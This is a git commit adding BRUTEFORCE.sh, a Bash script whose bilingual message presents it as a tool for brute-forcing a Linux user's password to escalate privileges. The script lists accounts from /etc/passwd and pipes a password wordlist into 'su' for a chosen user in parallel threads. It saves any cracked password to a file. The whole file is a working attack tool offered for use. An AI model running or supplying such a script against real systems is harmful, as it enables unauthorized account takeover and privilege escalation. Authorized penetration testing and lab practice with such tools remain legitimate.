69dfa4ce343e4ae3a80ac13c8daa878dcef74a1c
SevenXploit <89667542+SevenXploit@users.noreply.github.com>
2024-09-30 23:24:18 +0200

    Add files via upload
    Esté script sirve para hacer fuerza bruta a un usuario a la hora de elevar privilegios en una maquina Linux, leer encarecidamente el "README.txt"  para saber utilizarlo
    This script is used to brute force a user when elevating privileges on a Linux machine, carefully read the "README.txt" to know how to use it.

---
+++ BRUTEFORCE.sh
@@ -0,0 +1,37 @@
+#!/bin/bash
+PASSWORDS_FILE="passwords.txt"
+echo -e "Cuantos hilos quieres que contemple el script?: \c" #BY ANGEL TRIPIANA SANZ
+read THREADS
+echo 
+echo "..............................."
+cat /etc/passwd | grep bash 
+echo "..............................."
+echo
+echo  
+echo "Estos son los usuarios encontrados en la maquina" 
+echo 
+echo -e "ha que usuario quieres pivotar dentro de la maquina: \c"
+read USUARIO
+try_password() {
+    password=$1
+    echo "$password" | su $USUARIO  -c 'echo "Acceso concedido"' &> /dev/null
+    if [ $? -eq 0 ]; then
+        echo "¡Contraseña encontrada: $password!"
+        echo "$password" > passwordpwned.txt
+	exit 0
+    fi
+}
+count=0
+while IFS= read -r password
+do   
+    	echo "Probando contraseña: $password" 
+    	try_password "$password" &  
+    	((count++))
+    	if (( count % THREADS == 0 )); then
+        	wait  
+    	fi
+
+      
+done < "$PASSWORDS_FILE"
+
+wait 
